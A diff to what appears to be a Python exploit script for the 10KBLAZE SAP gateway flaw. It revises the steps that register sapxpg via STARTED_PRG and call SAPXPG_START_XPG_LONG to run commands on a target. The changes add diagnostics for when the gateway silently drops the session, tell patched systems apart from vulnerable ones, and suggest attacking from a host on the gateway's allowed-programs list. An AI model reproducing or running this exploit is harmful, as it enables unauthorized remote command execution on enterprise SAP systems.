@@ -1039,15 +1039,25 @@ def main():
         sys.exit(1)
     print("[+] Accepted by gateway (%d frame(s))" % len(p1_frames))
 
-    # Step 2: F_SAP_INIT
-    # ABAP gateways ACK this with the conv_id we use in P3.
-    # SAP Java gateways may NOT send an ACK at all — they silently register
-    # the session and wait for P3 (F_SAP_SEND) directly.
-    # Strategy: try to read the ACK with a short 3s window; if nothing arrives,
-    # proceed with a fallback conv_id and attempt P3 anyway.
+    # Step 2: F_SAP_INIT (STARTED_PRG -> sapxpg)
+    # -----------------------------------------------------------------------
+    # Normal flow (vulnerable ABAP gateway):
+    #   Gateway accepts STARTED_PRG registration and returns an ACK containing
+    #   the 8-digit conv_id we must use in P3.
+    #
+    # Patched / reginfo-protected gateway (SAP Note 2808158 / kernel 745+):
+    #   Gateway silently drops F_SAP_INIT with no response.  Any subsequent
+    #   packet that references the non-existent session returns error 728
+    #   "Conversation X not found".  This is the definitive sign that the
+    #   system is NOT vulnerable to the STARTED_PRG variant of 10KBLAZE.
+    #
+    # We attempt F_SAP_INIT twice (second attempt reconnects) to rule out
+    # transient packet loss, then diagnose based on the result.
+    # -----------------------------------------------------------------------
     print("\n[*] Step 2: F_SAP_INIT (STARTED_PRG -> sapxpg)")
     ni_send(sock, p2_data)
     conv_id = None
+    f_sap_init_timed_out = False
     try:
         first_p2 = ni_recv(sock, args.timeout)
         p2_frames = [first_p2] + ni_drain(sock, 1)
@@ -1058,7 +1068,7 @@ def main():
         for f in p2_frames:
             info = parse_response(f, "F_SAP_INIT")
             if info["error"]:
-                print("[-] F_SAP_INIT error: %s" % info["error_msg"])
+                print("[-] F_SAP_INIT rejected: %s" % info["error_msg"])
                 sock.close()
                 sys.exit(1)
             if info["conv_id"] and not conv_id:
@@ -1068,18 +1078,20 @@ def main():
         else:
             print("[*] No conv_id in F_SAP_INIT response — using fallback")
     except socket.timeout:
-        # Java gateway did not ACK — proceed with fallback conv_id
-        print("[*] No F_SAP_INIT ACK (Java gateway?) — proceeding with fallback conv_id")
+        f_sap_init_timed_out = True
+        print("[!] F_SAP_INIT got no response (gateway silent)")
+
+    if f_sap_init_timed_out:
+        print("[!] DIAGNOSIS: The gateway silently dropped F_SAP_INIT.")
+        print("[!]   This is the behaviour of a gateway protected by reginfo/secinfo")
+        print("[!]   (SAP Note 2808158) or with a default-deny policy on kernel 745+.")
+        print("[!]   The system is likely NOT vulnerable to the STARTED_PRG variant")
+        print("[!]   of 10KBLAZE from this source IP (%s)." % local_ip)
+        print("[!]   Continuing anyway to confirm via P3 response...")
 
     if not conv_id:
-        # Fallback: reuse the same conv_id that was put in the P2 request header.
-        # build_saprfc_header_v6 defaults conv_id to b"0" + b"\x00"*7 when None.
-        # Kernel 754 silently stores the session under that key without sending
-        # an ACK.  Using "0" here causes pad_right_null("0", 8) to produce
-        # b"0\x00\x00\x00\x00\x00\x00\x00" which exactly matches the P2 header,
-        # so the gateway can look up the session in subsequent packets.
         conv_id = "0"
-        print("[*] Using fallback conv_id: 0  (= b\"0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", matches P2 header)")
+        print("[*] Using fallback conv_id: 0  (= b\"0\\x00...\", matching P2 header)")
 
     # Step 3: F_SAP_SEND (SAPXPG_START_XPG_LONG)
     # SAP Java gateways send multiple NI frames in response to this step:
@@ -1113,6 +1125,11 @@ def main():
         frame_info = parse_response(resp, "SAPXPG_START_XPG_LONG")
         if frame_info["error"]:
             print("[-] Error: %s" % frame_info["error_msg"])
+            if f_sap_init_timed_out and "not found" in frame_info.get("error_msg", "").lower():
+                print("[-] CONFIRMED: Gateway rejected F_SAP_INIT (no session was created).")
+                print("[-] This system is NOT vulnerable to 10KBLAZE (STARTED_PRG) from")
+                print("[-] this source IP.  Check gwrd reginfo/secinfo on the target, or")
+                print("[-] run from a host that is in the gateway's allowed-programs list.")
             sock.close()
             sys.exit(1)
 
